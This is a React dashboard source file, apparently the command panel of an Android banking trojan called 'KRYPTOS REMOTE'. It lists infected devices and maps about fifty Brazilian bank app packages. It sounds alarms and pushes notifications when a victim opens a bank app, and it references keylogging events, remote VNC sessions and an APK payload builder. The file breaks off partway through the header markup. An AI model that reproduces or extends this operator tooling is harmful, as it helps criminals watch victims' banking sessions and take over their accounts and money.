import { useState, useEffect, useMemo, useCallback, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import { devicesAPI, apkStudioAPI, authAPI, getApiBaseUrl } from '../services/api';
import type { Device } from '../types';
import { RefreshCw, Package, Bell, Volume2, VolumeX, Activity, Trash2, Smartphone, Sparkles, Download, X, User, Zap, Monitor, Wifi, Eye, EyeOff, Copy } from 'lucide-react';
import DashboardSidebar from '../components/dashboard/DashboardSidebar';
import DeviceTable from '../components/dashboard/DeviceTable';
import ContextMenu from '../components/dashboard/ContextMenu';
import QuickVNCModal from '../components/dashboard/QuickVNCModal';
import RobotAssistant from '../components/RobotAssistant';
import LanguageSelector from '../components/LanguageSelector';
import { useTranslation } from '../utils/i18n';
import { useContextMenu } from '../hooks/useContextMenu';
import { mapDeviceToCliente } from '../utils/mapDeviceToCliente';
import type { Cliente } from '../types/dashboard';
// ===== ÍCONES DE BANCO BASEADOS EM MARCA =====
const BANK_BRAND_MAP: Record<string, { bg: string; text: string; label: string; emoji?: string }> = {
  'com.nu.production':        { bg: 'linear-gradient(135deg,#820ad1,#99005b)', text: '#fff', label: 'NU' },
  'com.nubank':               { bg: 'linear-gradient(135deg,#820ad1,#99005b)', text: '#fff', label: 'NU' },
  'br.com.bradesco':          { bg: 'linear-gradient(135deg,#cc0000,#8b0000)', text: '#fff', label: 'BD' },
  'coe.bradesco':             { bg: 'linear-gradient(135deg,#cc0000,#8b0000)', text: '#fff', label: 'BD' },
  'com.bradesco':             { bg: 'linear-gradient(135deg,#cc0000,#8b0000)', text: '#fff', label: 'BD' },
  'br.com.itau':              { bg: 'linear-gradient(135deg,#ec7000,#c25a00)', text: '#fff', label: 'IT' },
  'com.itau':                 { bg: 'linear-gradient(135deg,#ec7000,#c25a00)', text: '#fff', label: 'IT' },
  'br.com.bb.android':        { bg: 'linear-gradient(135deg,#ffcc00,#e6b800)', text: '#663300', label: 'BB' },
  'com.bb.android':           { bg: 'linear-gradient(135deg,#ffcc00,#e6b800)', text: '#663300', label: 'BB' },
  'com.santander.app':        { bg: 'linear-gradient(135deg,#ec0000,#a30000)', text: '#fff', label: 'SAN' },
  'br.com.santander':         { bg: 'linear-gradient(135deg,#ec0000,#a30000)', text: '#fff', label: 'SAN' },
  'br.com.bancointer':        { bg: 'linear-gradient(135deg,#ff7a00,#e06900)', text: '#fff', label: 'INT' },
  'br.com.intermedium':       { bg: 'linear-gradient(135deg,#ff7a00,#e06900)', text: '#fff', label: 'INT' },
  'br.com.caixa':             { bg: 'linear-gradient(135deg,#005ca9,#703d00)', text: '#fff', label: 'CEF' },
  'br.gov.caixa':             { bg: 'linear-gradient(135deg,#005ca9,#703d00)', text: '#fff', label: 'CEF' },
  'br.com.c6bank':            { bg: 'linear-gradient(135deg,#242424,#000)', text: '#ffd700', label: 'C6' },
  'br.com.neon':              { bg: 'linear-gradient(135deg,#ffbf00,#aa8000)', text: '#fff', label: 'NEO' },
  'br.com.pagbank':           { bg: 'linear-gradient(135deg,#03a64a,#027a35)', text: '#fff', label: 'PAG' },
  'br.com.uol.ps.myaccount':  { bg: 'linear-gradient(135deg,#03a64a,#027a35)', text: '#fff', label: 'PAG' },
  'com.pagseguro':            { bg: 'linear-gradient(135deg,#03a64a,#027a35)', text: '#fff', label: 'PAG' },
  'com.mercadopago':          { bg: 'linear-gradient(135deg,#e39e00,#b67700)', text: '#fff', label: 'MP' },
  'br.com.picpay':            { bg: 'linear-gradient(135deg,#11c76f,#0aa05a)', text: '#fff', label: 'PIC' },
  'com.picpay':               { bg: 'linear-gradient(135deg,#11c76f,#0aa05a)', text: '#fff', label: 'PIC' },
  'com.panapp':               { bg: 'linear-gradient(135deg,#8b3f1b,#6a2b12)', text: '#fff', label: 'PAN' },
  'br.com.sicredi':           { bg: 'linear-gradient(135deg,#009933,#006622)', text: '#fff', label: 'SIC' },
  'br.com.original':          { bg: 'linear-gradient(135deg,#d8b400,#c79600)', text: '#fff', label: 'ORI' },
  'br.com.stone':             { bg: 'linear-gradient(135deg,#00af83,#008f6b)', text: '#fff', label: 'STN' },
  'br.com.digio':             { bg: 'linear-gradient(135deg,#ff2f7b,#d41f5c)', text: '#fff', label: 'DIG' },
  'com.will.bank':            { bg: 'linear-gradient(135deg,#ad0d6a,#82004b)', text: '#fff', label: 'WIL' },
  'br.com.agibank':           { bg: 'linear-gradient(135deg,#ff4500,#cc3700)', text: '#fff', label: 'AGI' },
  'br.com.sofisa':            { bg: 'linear-gradient(135deg,#c06515,#a1470d)', text: '#fff', label: 'SOF' },
  'com.citibank.mobile.br':   { bg: 'linear-gradient(135deg,#873000,#5c1f00)', text: '#fff', label: 'CITI' },
  'br.com.banrisul':          { bg: 'linear-gradient(135deg,#aa5b00,#783d00)', text: '#fff', label: 'BNR' },
  'br.com.sicoob':            { bg: 'linear-gradient(135deg,#005951,#003e38)', text: '#fff', label: 'SCB' },
  'com.sicoob':               { bg: 'linear-gradient(135deg,#005951,#003e38)', text: '#fff', label: 'SCB' },
  'com.btg.pactual.banking':  { bg: 'linear-gradient(135deg,#380f04,#150503)', text: '#d4af37', label: 'BTG' },
  'com.btg.pactual.investimentos': { bg: 'linear-gradient(135deg,#380f04,#150503)', text: '#d4af37', label: 'BTG' },
  'com.rico.rico':            { bg: 'linear-gradient(135deg,#ff4500,#cc3700)', text: '#fff', label: 'RCO' },
  'br.com.clear':             { bg: 'linear-gradient(135deg,#1f1f1f,#000)', text: '#00ff00', label: 'CLR' },
  'us.avenue':                { bg: 'linear-gradient(135deg,#7f1d1d,#450a0a)', text: '#fff', label: 'AVE' },
  'com.nomadglobal':          { bg: 'linear-gradient(135deg,#10b981,#064e3b)', text: '#fff', label: 'NOM' },
  'br.com.mercantildobrasil': { bg: 'linear-gradient(135deg,#993300,#662200)', text: '#fff', label: 'MCB' },
  'br.com.superdigital':      { bg: 'linear-gradient(135deg,#dc2626,#7f1d1d)', text: '#fff', label: 'SUP' },
  'com.genialinvestimentos':  { bg: 'linear-gradient(135deg,#dc2626,#450a0a)', text: '#fff', label: 'GEN' },
  'br.com.bancobari':         { bg: 'linear-gradient(135deg,#ed3a7c,#951d4c)', text: '#fff', label: 'BAR' },
  'br.com.pine':              { bg: 'linear-gradient(135deg,#b91c1c,#991b1b)', text: '#fff', label: 'PNE' },
  'br.com.bmg.android':       { bg: 'linear-gradient(135deg,#ea580c,#7c2d12)', text: '#fff', label: 'BMG' },
  'br.com.bancovotorantim':   { bg: 'linear-gradient(135deg,#991b1b,#7f1d1d)', text: '#fff', label: 'BV' },
  'br.com.bs2.banco':         { bg: 'linear-gradient(135deg,#dc2626,#7f1d1d)', text: '#fff', label: 'BS2' },
  'br.com.next':              { bg: 'linear-gradient(135deg,#00ff5f,#009933)', text: '#000', label: 'NXT' },
  'br.com.safra':             { bg: 'linear-gradient(135deg,#854d0e,#422006)', text: '#fff', label: 'SFR' },
};
function getBankBrand(pkg: string) {
  if (!pkg) return { bg: 'linear-gradient(135deg,#5f3a1e,#401105)', text: '#ffa3a3', label: '🏦' };
  const pkgLower = pkg.toLowerCase();
  if (BANK_BRAND_MAP[pkgLower]) return BANK_BRAND_MAP[pkgLower];
  for (const key of Object.keys(BANK_BRAND_MAP)) {
    if (pkgLower.startsWith(key)) return BANK_BRAND_MAP[key];
  }
  if (pkgLower.includes('nubank') || pkgLower.includes('nu.production')) return BANK_BRAND_MAP['com.nu.production'];
  if (pkgLower.includes('bradesco')) return BANK_BRAND_MAP['br.com.bradesco'];
  if (pkgLower.includes('itau')) return BANK_BRAND_MAP['br.com.itau'];
  if (pkgLower.includes('bb.android') || pkgLower.includes('bancodobrasil')) return BANK_BRAND_MAP['br.com.bb.android'];
  if (pkgLower.includes('santander')) return BANK_BRAND_MAP['com.santander.app'];
  if (pkgLower.includes('inter') || pkgLower.includes('intermedium')) return BANK_BRAND_MAP['br.com.bancointer'];
  if (pkgLower.includes('caixa')) return BANK_BRAND_MAP['br.com.caixa'];
  if (pkgLower.includes('c6bank')) return BANK_BRAND_MAP['br.com.c6bank'];
  if (pkgLower.includes('neon')) return BANK_BRAND_MAP['br.com.neon'];
  if (pkgLower.includes('pagbank') || pkgLower.includes('pagseguro') || pkgLower.includes('myaccount')) return BANK_BRAND_MAP['br.com.pagbank'];
  if (pkgLower.includes('mercadopago')) return BANK_BRAND_MAP['com.mercadopago'];
  if (pkgLower.includes('picpay')) return BANK_BRAND_MAP['br.com.picpay'];
  if (pkgLower.includes('panapp') || pkgLower.includes('pan.card')) return BANK_BRAND_MAP['com.panapp'];
  if (pkgLower.includes('sicredi')) return BANK_BRAND_MAP['br.com.sicredi'];
  if (pkgLower.includes('stone')) return BANK_BRAND_MAP['br.com.stone'];
  if (pkgLower.includes('digio')) return BANK_BRAND_MAP['br.com.digio'];
  if (pkgLower.includes('willbank')) return BANK_BRAND_MAP['com.will.bank'];
  if (pkgLower.includes('agibank')) return BANK_BRAND_MAP['br.com.agibank'];
  if (pkgLower.includes('sicoob')) return BANK_BRAND_MAP['br.com.sicoob'];
  if (pkgLower.includes('btg')) return BANK_BRAND_MAP['com.btg.pactual.banking'];
  if (pkgLower.includes('rico')) return BANK_BRAND_MAP['com.rico.rico'];
  if (pkgLower.includes('clear')) return BANK_BRAND_MAP['br.com.clear'];
  if (pkgLower.includes('avenue')) return BANK_BRAND_MAP['us.avenue'];
  if (pkgLower.includes('nomad')) return BANK_BRAND_MAP['com.nomadglobal'];
  if (pkgLower.includes('mercantil')) return BANK_BRAND_MAP['br.com.mercantildobrasil'];
  if (pkgLower.includes('superdigital')) return BANK_BRAND_MAP['br.com.superdigital'];
  if (pkgLower.includes('genial')) return BANK_BRAND_MAP['com.genialinvestimentos'];
  if (pkgLower.includes('bari')) return BANK_BRAND_MAP['br.com.bancobari'];
  if (pkgLower.includes('pine')) return BANK_BRAND_MAP['br.com.pine'];
  if (pkgLower.includes('bmg')) return BANK_BRAND_MAP['br.com.bmg.android'];
  if (pkgLower.includes('votorantim') || pkgLower.includes('bv')) return BANK_BRAND_MAP['br.com.bancovotorantim'];
  if (pkgLower.includes('bs2')) return BANK_BRAND_MAP['br.com.bs2.banco'];
  if (pkgLower.includes('next')) return BANK_BRAND_MAP['br.com.next'];
  if (pkgLower.includes('safra')) return BANK_BRAND_MAP['br.com.safra'];
  return { bg: 'linear-gradient(135deg,#5f3a1e,#401105)', text: '#ffa3a3', label: '🏦' };
}
interface BankIconProps { pkg: string; iconB64?: string; name?: string; size?: number; }
function BankIcon({ pkg, iconB64, name, size = 36 }: BankIconProps) {
  const [imgError, setImgError] = useState(false);
  const brand = getBankBrand(pkg);
  const fontSize = size <= 36 ? (brand.label.length > 2 ? 9 : 11) : (brand.label.length > 2 ? 11 : 14);
  
  if (iconB64 && iconB64.length > 100 && !imgError) {
    const src = iconB64.startsWith('data:') ? iconB64 : `data:image/png;base64,${iconB64}`;
    return (
      <img
        src={src}
        alt={name || pkg}
        width={size} height={size}
        style={{ borderRadius: 8, objectFit: 'contain', flexShrink: 0 }}
        onError={() => setImgError(true)}
      />
    );
  }
  
  return (
    <div
      style={{
        width: size, height: size, borderRadius: 8,
        background: brand.bg,
        display: 'flex', alignItems: 'center', justifyContent: 'center',
        flexShrink: 0, boxShadow: '0 2px 8px rgba(0,0,0,0.4)',
        fontWeight: 900, fontSize, color: brand.text,
        letterSpacing: brand.label.length > 2 ? '0px' : '0.5px',
        fontFamily: 'Inter, system-ui, sans-serif',
        userSelect: 'none'
      }}
    >
      {brand.label}
    </div>
  );
}
interface AlertItem {
  deviceId: string;
  deviceModel: string;
  bankPackage: string;
  bankName: string;
  status: 'open' | 'closed';
  timestamp: string;
  iconB64?: string;
}
interface DashboardProps {
  onLogout: () => void;
}
interface ActivityEvent {
  id: string;
  type: 'bank_open' | 'bank_close' | 'device_online' | 'device_offline' | 'numeric_keypad' | 'keylog' | 'notification';
  deviceId: string;
  deviceModel: string;
  title: string;
  description: string;
  timestamp: string;
  bankPackage?: string;
  iconB64?: string;
}
export default function Dashboard({ onLogout }: DashboardProps) {
  const { t } = useTranslation();
  const [devices, setDevices] = useState<Device[]>([]);
  const [alerts, setAlerts] = useState<AlertItem[]>([]);
  const [toasts, setToasts] = useState<any[]>([]);
  const [activityLog, setActivityLog] = useState<ActivityEvent[]>([]);
  const [isSidebarOpen, setIsSidebarOpen] = useState(true);
  const [soundEnabled, setSoundEnabled] = useState(true);
  const [hideIps, setHideIps] = useState<boolean>(() => localStorage.getItem('hide_ips') !== 'false');
  const prevDevicesRef = useRef<Device[]>([]);
  const [serverPing, setServerPing] = useState<number>(14);
  const [initialLoading, setInitialLoading] = useState(true);
  const [refreshing, setRefreshing] = useState(false);
  const navigate = useNavigate();
  const { menu, openMenu, closeMenu } = useContextMenu();
  const hasLoadedOnce = useRef(false);
  const [builds, setBuilds] = useState<any[]>([]);
  const [buildsLoading, setBuildsLoading] = useState(true);
  const [showMyAppsModal, setShowMyAppsModal] = useState(false);
  const [quickVncDevices, setQuickVncDevices] = useState<Cliente[]>([]);

  const handleOpenVnc = useCallback((cliente: Cliente) => {
    setQuickVncDevices((prev) => {
      if (prev.some((d) => d.deviceId === cliente.deviceId)) return prev;
      return [...prev, cliente];
    });
  }, []);

  const handleRemoveVnc = useCallback((deviceId: string) => {
    setQuickVncDevices((prev) => prev.filter((d) => d.deviceId !== deviceId));
  }, []);
  // Estados do Modal de Perfil
  const [showProfileModal, setShowProfileModal] = useState(false);
  const [profileUsername, setProfileUsername] = useState('');
  const [profileEmail, setProfileEmail] = useState('');
  const [profilePassword, setProfilePassword] = useState('');
  const [profileConfirmPassword, setProfileConfirmPassword] = useState('');
  const [profileError, setProfileError] = useState('');
  const [profileSuccess, setProfileSuccess] = useState('');
  const [isSavingProfile, setIsSavingProfile] = useState(false);

  const [isMobile, setIsMobile] = useState(window.innerWidth < 640);
  const showToast = useCallback((title: string, body: string, type: 'open' | 'closed', bankPkg: string, iconB64?: string) => {
    const id = Math.random().toString(36).substring(2, 9);
    setToasts((prev) => [...prev, { id, title, body, type, bankPkg, iconB64 }]);
    
    // Auto-remove after 5 seconds
    setTimeout(() => {
      setToasts((prev) => prev.filter((t) => t.id !== id));
    }, 5000);
  }, []);
  const playAlertSound = useCallback(() => {
    if (!soundEnabled) return;
    try {
      const AudioContextClass = (window as any).AudioContext || (window as any).webkitAudioContext;
      if (!AudioContextClass) return;
      
      const audioCtx = new AudioContextClass();
      
      // Bip 1 (Glow agudo)
      const osc1 = audioCtx.createOscillator();
      const gain1 = audioCtx.createGain();
      
      osc1.type = 'sine';
      osc1.frequency.setValueAtTime(880, audioCtx.currentTime); 
      osc1.frequency.exponentialRampToValueAtTime(440, audioCtx.currentTime + 0.15); 
      
      gain1.gain.setValueAtTime(0.12, audioCtx.currentTime);
      gain1.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.25); 
      
      osc1.connect(gain1);
      gain1.connect(audioCtx.destination);
      
      osc1.start();
      osc1.stop(audioCtx.currentTime + 0.25);
      
      // Bip 2 (Eco futurista imediato)
      setTimeout(() => {
        const osc2 = audioCtx.createOscillator();
        const gain2 = audioCtx.createGain();
        osc2.type = 'sine';
        osc2.frequency.setValueAtTime(1046, audioCtx.currentTime); 
        osc2.frequency.exponentialRampToValueAtTime(523, audioCtx.currentTime + 0.15); 
        
        gain2.gain.setValueAtTime(0.12, audioCtx.currentTime);
        gain2.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.25); 
        
        osc2.connect(gain2);
        gain2.connect(audioCtx.destination);
        
        osc2.start();
        osc2.stop(audioCtx.currentTime + 0.25);
      }, 130);
      
    } catch (e) {
      console.warn("AudioContext blocked/not supported", e);
    }
  }, [soundEnabled]);
  const playConnectionSound = useCallback(() => {
    if (!soundEnabled) return;
    try {
      const AudioContextClass = (window as any).AudioContext || (window as any).webkitAudioContext;
      if (!AudioContextClass) return;
      const audioCtx = new AudioContextClass();
      
      const osc = audioCtx.createOscillator();
      const gain = audioCtx.createGain();
      osc.type = 'sine';
      osc.frequency.setValueAtTime(523.25, audioCtx.currentTime); 
      osc.frequency.exponentialRampToValueAtTime(783.99, audioCtx.currentTime + 0.15); 
      
      gain.gain.setValueAtTime(0.08, audioCtx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.2); 
      
      osc.connect(gain);
      gain.connect(audioCtx.destination);
      osc.start();
      osc.stop(audioCtx.currentTime + 0.2);
    } catch (e) {
      console.warn(e);
    }
  }, [soundEnabled]);
  const playDisconnectionSound = useCallback(() => {
    if (!soundEnabled) return;
    try {
      const AudioContextClass = (window as any).AudioContext || (window as any).webkitAudioContext;
      if (!AudioContextClass) return;
      const audioCtx = new AudioContextClass();
      
      const osc = audioCtx.createOscillator();
      const gain = audioCtx.createGain();
      osc.type = 'sine';
      osc.frequency.setValueAtTime(392.00, audioCtx.currentTime); 
      osc.frequency.exponentialRampToValueAtTime(261.63, audioCtx.currentTime + 0.18); 
      
      gain.gain.setValueAtTime(0.08, audioCtx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.22); 
      
      osc.connect(gain);
      gain.connect(audioCtx.destination);
      osc.start();
      osc.stop(audioCtx.currentTime + 0.22);
    } catch (e) {
      console.warn(e);
    }
  }, [soundEnabled]);
  useEffect(() => {
    // Solicita permissão para notificações do navegador
    if ('Notification' in window && Notification.permission === 'default') {
      Notification.requestPermission();
    }
    
    const handleResize = () => setIsMobile(window.innerWidth < 640);
    window.addEventListener('resize', handleResize);
    return () => window.removeEventListener('resize', handleResize);
  }, []);
  const loadDevices = useCallback(async (silent = false) => {
    try {
      if (!silent && !hasLoadedOnce.current) {
        setInitialLoading(true);
      } else if (!silent) {
        setRefreshing(true);
      }
      const t0 = performance.now();
      const data = await devicesAPI.getAll();
      const t1 = performance.now();
      const measuredPing = Math.max(4, Math.round(t1 - t0));
      if (measuredPing < 2000) {
        setServerPing(measuredPing);
      }
      setDevices(data);
      hasLoadedOnce.current = true;
    } catch (error) {
      console.error('Erro ao carregar dispositivos:', error);
    } finally {
      if (!silent) {
        setInitialLoading(false);
        setRefreshing(false);
      }
    }
  }, []);
  useEffect(() => {
    loadDevices(false);
    const interval = setInterval(() => {
      if (!document.hidden) {
        loadDevices(true);
      }
    }, 5000);
    return () => clearInterval(interval);
  }, [loadDevices]);
  const loadBuilds = useCallback(async () => {
    try {
      setBuildsLoading(true);
      const data = await apkStudioAPI.getBuilds();
      setBuilds(data);
    } catch (error) {
      console.error('Erro ao carregar histórico de builds:', error);
    } finally {
      setBuildsLoading(false);
    }
  }, []);
  useEffect(() => {
    loadBuilds();
  }, [loadBuilds]);
  // Carrega dados do perfil atual
  const loadUserProfile = async () => {
    try {
      const data = await authAPI.me();
      setProfileUsername(data.username);
      setProfileEmail(data.email || '');
      setProfilePassword('');
      setProfileConfirmPassword('');
      setProfileError('');
      setProfileSuccess('');
    } catch (err) {
      console.error('Erro ao carregar dados do perfil:', err);
    }
  };
  // Salva dados do perfil
  const handleSaveProfile = async (e: React.FormEvent) => {
    e.preventDefault();
    setProfileError('');
    setProfileSuccess('');
    
    if (profilePassword && profilePassword !== profileConfirmPassword) {
      setProfileError('As senhas não coincidem.');
      return;
    }
    setIsSavingProfile(true);
    try {
      await authAPI.updateProfile({
        username: profileUsername,
        email: profileEmail,
        password: profilePassword || undefined
      });
      setProfileSuccess('Perfil atualizado com sucesso!');
      setProfilePassword('');
      setProfileConfirmPassword('');
    } catch (err: any) {
      setProfileError(err?.response?.data?.detail || 'Erro ao atualizar perfil.');
    } finally {
      setIsSavingProfile(false);
    }
  };

  const loadActivityFeed = useCallback(async () => {
    try {
      const token = localStorage.getItem('token');
      const response = await fetch(`${getApiBaseUrl()}/api/activity-feed`, {
        headers: { 'Authorization': `Bearer ${token}` }
      });
      let serverEvents: any[] = [];
      if (response.ok) {
        const data = await response.json();
        if (Array.isArray(data)) {
          serverEvents = data;
        }
      }

      // Merge com bancos ativos em tempo real dos dispositivos online
      const liveBankEvents: ActivityEvent[] = [];
      devices.forEach(dev => {
        if (dev.is_online && dev.active_bank) {
          const modelName = `${dev.manufacturer || ''} ${dev.model || ''}`.trim().toUpperCase() || dev.device_id;
          const appName = dev.active_bank.appName || 'Banco';
          liveBankEvents.push({
            id: `active-live-${dev.device_id}`,
            type: 'bank_open',
            deviceId: dev.device_id,
            deviceModel: modelName,
            title: `🚨 BANCO ABERTO: ${appName}`,
            description: `Acessando conta bancária agora!`,
            timestamp: new Date().toLocaleTimeString('pt-BR'),
            bankPackage: dev.active_bank.package,
            iconB64: dev.active_bank.icon
          });
        }
      });

      const combined = [...liveBankEvents, ...serverEvents];
      const seenKeys = new Set<string>();
      const uniqueBankEvents = combined.filter(e => {
        const isBankAlert = e.type === 'bank_open' || e.type === 'bank_close' || (e.title && e.title.includes('BANCO'));
        if (!isBankAlert) return false;
        const key = `${e.deviceId}-${e.type}-${e.bankPackage || ''}`;
        if (seenKeys.has(key)) return false;
        seenKeys.add(key);
        return true;
      });

      setActivityLog(uniqueBankEvents.slice(0, 50));
    } catch (err) {
      console.error('Erro ao carregar feed de atividades:', err);
    }
  }, [devices]);

  useEffect(() => {
    loadActivityFeed();
    const actInterval = setInterval(() => {
      if (!document.hidden) {
        loadActivityFeed();
      }
    }, 1000);
    return () => clearInterval(actInterval);
  }, [loadActivityFeed]);

  useEffect(() => {
    if (devices.length === 0) return;
    
    const nowStr = new Date().toLocaleTimeString('pt-BR');
    const prevDevices = prevDevicesRef.current;
    
    const newEvents: ActivityEvent[] = [];
    
    // Detect events if we have previous devices state
    const shouldNotify = prevDevices.length > 0;
    
    devices.forEach((dev) => {
      const prevDev = prevDevices.find(d => d.device_id === dev.device_id);
      const modelName = `${dev.manufacturer} ${dev.model}`.toUpperCase();
      
      // 1. Connection Event: offline -> online
      if (prevDev && !prevDev.is_online && dev.is_online) {
        newEvents.push({
          id: Math.random().toString(36).substring(2, 9),
          type: 'device_online',
          deviceId: dev.device_id,
          deviceModel: modelName,
          title: '📶 APARELHO CONECTADO',
          description: `Dispositivo estabeleceu conexão ativa.`,
          timestamp: nowStr
        });
        if (shouldNotify) {
          playConnectionSound();
        }
      }
      
      // 2. Connection Event: online -> offline
      if (prevDev && prevDev.is_online && !dev.is_online) {
        newEvents.push({
          id: Math.random().toString(36).substring(2, 9),
          type: 'device_offline',
          deviceId: dev.device_id,
          deviceModel: modelName,
          title: '⚠️ APARELHO DESCONECTADO',
          description: `Aparelho perdeu conexão com o servidor.`,
          timestamp: nowStr
        });
        if (shouldNotify) {
          playDisconnectionSound();
        }
      }
      
      // 3. Bank Access Event
      if (dev.is_online && dev.active_bank) {
        const prevBank = prevDev?.active_bank;
        if (!prevBank || prevBank.package !== dev.active_bank.package) {
          const appName = dev.active_bank.appName || 'Banco';
          newEvents.push({
            id: Math.random().toString(36).substring(2, 9),
            type: 'bank_open',
            deviceId: dev.device_id,
            deviceModel: modelName,
            title: `🚨 BANCO ABERTO: ${appName}`,
            description: `Acessando conta bancária agora!`,
            timestamp: nowStr,
            bankPackage: dev.active_bank.package,
            iconB64: dev.active_bank.icon
          });
          
          if (shouldNotify) {
            playAlertSound();
            showToast(
              "🚨 BANCO ACESSADO!",
              `${modelName} está acessando o ${appName}`,
              "open",
              dev.active_bank.package,
              dev.active_bank.icon
            );
            
            if ("Notification" in window && Notification.permission === "granted") {
              try {
                new Notification(`🚨 Banco Acessado: ${appName}`, {
                  body: `Aparelho ${modelName} abriu o aplicativo!`,
                  icon: "/gangstar-logo.svg"
                });
              } catch (e) {
                console.error("Erro ao enviar push notification:", e);
              }
            }
          }
        }
      }
      
      // 4. Bank Close Event
      if (prevDev && prevDev.active_bank && (!dev.active_bank || dev.active_bank.package !== prevDev.active_bank.package)) {
        const appName = prevDev.active_bank.appName || 'Banco';
        newEvents.push({
          id: Math.random().toString(36).substring(2, 9),
          type: 'bank_close',
          deviceId: dev.device_id,
          deviceModel: modelName,
          title: `ℹ️ BANCO FECHADO: ${appName}`,
          description: `Fechou o aplicativo bancário.`,
          timestamp: nowStr,
          bankPackage: prevDev.active_bank.package,
          iconB64: prevDev.active_bank.icon
        });
        
        if (shouldNotify) {
          showToast(
            "ℹ️ BANCO FECHADO",
            `${modelName} fechou o ${appName}`,
            "closed",
            prevDev.active_bank.package,
            prevDev.active_bank.icon
          );
          
          if ("Notification" in window && Notification.permission === "granted") {
            try {
              new Notification(`ℹ️ Banco Fechado: ${appName}`, {
                body: `Aparelho ${modelName} fechou o aplicativo.`,
                icon: "/gangstar-logo.svg"
              });
            } catch (e) {
              console.error("Erro ao enviar push notification:", e);
            }
          }
        }
      }
    });
    
    // Also check for new devices that weren't in prevDevices at all (initial load/registration)
    if (shouldNotify) {
      devices.forEach((dev) => {
        const exists = prevDevices.some(d => d.device_id === dev.device_id);
        if (!exists) {
          const modelName = `${dev.manufacturer} ${dev.model}`.toUpperCase();
          newEvents.push({
            id: Math.random().toString(36).substring(2, 9),
            type: 'device_online',
            deviceId: dev.device_id,
            deviceModel: modelName,
            title: '✨ NOVO APARELHO INSTALADO',
            description: `Novo dispositivo registrado no painel.`,
            timestamp: nowStr
          });
          playConnectionSound();
        }
      });
    }
    if (newEvents.length > 0) {
      const bankOpenOnlyEvents = newEvents.filter(e => e.type === 'bank_open' && (e.title ? e.title.includes('BANCO ABERTO') : true));
      if (bankOpenOnlyEvents.length > 0) {
        setActivityLog((prev) => {
          return [...bankOpenOnlyEvents, ...prev].slice(0, 50);
        });
      }
      
      const openedBankEvents = newEvents.filter(e => e.type === 'bank_open');
      const closedBankEvents = newEvents.filter(e => e.type === 'bank_close');
      
      if (openedBankEvents.length > 0 || closedBankEvents.length > 0) {
        setAlerts((prev) => {
          let updated = [...prev];
          
          const affectedDevIds = new Set([...openedBankEvents, ...closedBankEvents].map(a => a.deviceId));
          updated = updated.filter(a => !(affectedDevIds.has(a.deviceId) && a.status === 'open'));
          
          const newActions = [...openedBankEvents, ...closedBankEvents].map(e => ({
            deviceId: e.deviceId,
            deviceModel: e.deviceModel,
            bankPackage: e.bankPackage || '',
            bankName: e.title.replace('🚨 BANCO ABERTO: ', '').replace('ℹ️ BANCO FECHADO: ', ''),
            status: (e.type === 'bank_open' ? 'open' : 'closed') as 'open' | 'closed',
            timestamp: e.timestamp,
            iconB64: e.iconB64
          }));
          
          updated = [...newActions, ...updated];
          return updated.slice(0, 6);
        });
      }
    }
    
    prevDevicesRef.current = devices;
  }, [devices, soundEnabled, playConnectionSound, playDisconnectionSound, playAlertSound, showToast]);

  const clientes = useMemo(() => {
    const mapped = devices.map((d) => mapDeviceToCliente(d, hideIps)).filter((c) => {
      const isWin = c.deviceId.startsWith('WIN-') || 
                    (c.modelName && c.modelName.toLowerCase().includes('windows')) ||
                    (c.androidVersion && c.androidVersion.toLowerCase().includes('windows'));
      return !isWin;
    });
    const online = mapped.filter((c) => c.status === 'online');
    const offline = mapped.filter((c) => c.status === 'offline');
    return [...online, ...offline];
  }, [devices, hideIps]);

  const onlineCount = clientes.filter((c) => c.status === 'online').length;
  const offlineCount = clientes.length - onlineCount;

  const handleRowClick = (cliente: Cliente) => {
    if (cliente.status === 'online') {
      navigate(`/device/${cliente.deviceId}`);
    }
  };

  const handleDeleteDevice = useCallback(async (cliente: Cliente) => {
    if (!confirm(`Deseja realmente excluir o dispositivo offline "${cliente.modelName || cliente.deviceId}"?`)) {
      return;
    }
    try {
      await devicesAPI.deleteDevice(cliente.deviceId);
      loadDevices(false);
    } catch (err: any) {
      alert("Erro ao excluir dispositivo: " + (err.response?.data?.detail || err.message));
    }
  }, [loadDevices]);

  return (
    <div className="h-screen w-screen overflow-hidden bg-transparent text-slate-100 flex safe-top safe-bottom relative">
      {/* Background ambient lighting glow */}
      <div className="absolute top-0 left-1/4 w-[600px] h-[350px] bg-cyan-500/18 blur-[160px] pointer-events-none rounded-full" />
      <div className="absolute top-1/3 right-10 w-[500px] h-[350px] bg-blue-600/18 blur-[160px] pointer-events-none rounded-full" />

      <DashboardSidebar onLogout={onLogout} isMobile={isMobile} />

      <div className={`flex-1 flex flex-col h-full min-w-0 relative z-10 overflow-hidden ${isMobile ? 'pb-16' : ''}`}>
        {/* HEADER TOP BAR */}
        <header className="bg-[#190403]/70 border-b border-cyan-500/30 px-4 sm:px-6 py-3.5 flex-shrink-0 backdrop-blur-2xl relative shadow-[0_4px_25px_rgba(0,0,0,0.6)]">
          <div className="absolute bottom-0 left-0 right-0 h-[1px] bg-gradient-to-r from-transparent via-cyan-400/40 to-transparent"></div>
          <div className="flex items-center justify-between gap-4">
            {/* 💎 KRYPTOS REMOTE - BRANDING HEADER */}
            <div className="flex items-center gap-3 select-none">
              {/* Logo Redondo Azul com Brilho Neon */}
              <div className="relative flex items-center justify-center flex-shrink-0">
                <div className="absolute -inset-1 bg-sky-500/35 rounded-full blur-md animate-pulse" />
                <div className="relative w-8 h-8 rounded-full p-[1.5px] bg-gradient-to-tr from-cyan-400 to-blue-600 shadow-[0_0_15px_rgba(255,43,43,0.55)] flex items-center justify-center">
                  <div className="w-full h-full rounded-full bg-[#190403] flex items-center justify-center overflow-hidden">
                    <img
                      src="/gangstar-logo.svg?v=2"
                      alt="Kryptos Logo"
                      className="w-5 h-5 object-contain"
                      style={{ filter: 'drop-shadow(0 0 8px rgba(255, 43, 43, 0.95)) brightness(1.2)' }}
                    />
                  </div>
                </div>
              </div>

              {/* Apenas o Nome KRYPTOS REMOTE em Azul */}
              <h1 className="text-base sm:text-lg font-black tracking-wider uppercase font-sans bg-gradient-to-r from-cyan-300 via-sky-400 to-blue-500 bg-clip-text text-transparent drop-shadow-[0_0_12px_rgba(255,107,107,0.75)] leading-none">
                KRYPTOS REMOTE
